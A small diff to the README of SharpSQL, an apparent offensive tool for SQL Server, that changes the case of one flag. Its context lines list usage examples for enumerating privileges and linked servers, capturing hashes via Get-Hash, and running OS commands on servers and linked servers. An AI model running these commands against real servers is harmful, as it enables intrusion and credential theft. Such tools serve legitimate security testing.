@@ -58,7 +58,7 @@ Examples:
     SharpSQL.exe Get-UserPrivs -Instance sql.server
     SharpSQL.exe Get-Sysadmins -Instance sql.server
     SharpSQL.exe Get-LinkedServers -Instance sql.server
-    SharpSQL.exe Get-Hash -Instance sql.server -IP 10.10.10.10
+    SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
     SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command "whoami /all"
     SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command "dir C:\users\"
 ```
